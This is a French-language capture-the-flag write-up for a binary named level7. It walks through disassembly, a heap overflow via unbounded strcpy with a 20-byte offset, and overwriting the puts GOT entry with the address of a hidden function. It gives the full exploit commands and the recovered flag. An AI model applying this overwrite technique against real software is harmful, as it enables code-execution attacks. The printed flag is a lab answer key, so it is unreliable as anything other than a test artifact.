



# level7


## description
- Il y a un exécutable **level7**.
- Lorsqu'on l'exécute sans arguments, il **Segfault**.
- Lorsqu'on l'exécute avec 2 arguments, il affiche "**~~**".

## Résolution

Avec la commande **info function** et **disas main**, on voit qu'il y a une fonction **m** qui n'est pas appelée.

       0x0804852a <+9>:     mov    DWORD PTR [esp],0x8
       0x08048531 <+16>:    call   0x80483f0 <malloc@plt>
          0x08048559 <+56>:    mov    DWORD PTR [esp],0x8
       0x08048560 <+63>:    call   0x80483f0 <malloc@plt>
On voit deux **malloc** de 8 bytes.
Ensuite il ya deux appel de **strcpy** pour copier **argv[1]** et **argv[2]** dans les variables allouées.

       0x080485af <+142>:   mov    eax,DWORD PTR [esp+0x18]
       0x080485b3 <+146>:   mov    eax,DWORD PTR [eax+0x4]
       0x080485b6 <+149>:   mov    DWORD PTR [esp+0x4],edx
       0x080485ba <+153>:   mov    DWORD PTR [esp],eax
       0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>

**strcpy** n'est pas protégée et va copier jusqu'à la fin de la chaine de caractère.

      0x080485cc <+171>:   mov    DWORD PTR [esp+0x4],edx
       0x080485d0 <+175>:   mov    DWORD PTR [esp],eax
       0x080485d3 <+178>:   call   0x8048430 <fopen@plt>
       0x080485d8 <+183>:   mov    DWORD PTR [esp+0x8],eax
       0x080485dc <+187>:   mov    DWORD PTR [esp+0x4],0x44
       0x080485e4 <+195>:   mov    DWORD PTR [esp],0x8049960
       0x080485eb <+202>:   call   0x80483c0 <fgets@plt>

On peut voir qu'il y a une variable global c et qu'il utilise **fgets** pour stocker le contenu du **.pass**.

Notre objectif va être de réécrire le deuxième pointeur avec l'adresse de **puts**.
Ensuite avec le deuxième **strcpy**, on va placer l'adresse de la fonction **m** pour qu'a la place d'appeler **puts**, ca va appeler la fonction **m** qui va afficher le contenu de la variable **c**.

Tout d'abord, il faut trouver l'offset pour pouvoir réécrire le deuxième **malloc**(b[1]).
on va utiliser **ltrace** avec le pattern suivant.

    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
l'offset est a **20**.

Ensuite il faut trouver l'adresse de puts dans la Global Offsets Table.

(gdb) info function puts
All functions matching regular expression "puts":

    Non-debugging symbols:
    0x08048400  puts
    0x08048400  puts@plt
    (gdb) disas 0x08048400
    Dump of assembler code for function puts@plt:
       0x08048400 <+0>:     jmp    *0x8049928
       0x08048406 <+6>:     push   $0x28
       0x0804840b <+11>:    jmp    0x80483a0
    End of assembler dump.
   l'adresse de **puts** est **0x8049928**.
```c
ltrace ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') 42
strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAA(\231\004\b")                              = 0x0804a018
strcpy(0x08049928, "42")     
```
On a bien réussi à réécrire b[1].

On récupère l'adresse de la fonction m avec gdb , ce qui nous donne **0x080484f4**.

```
./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```
ce qui nous donne le flag
```
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```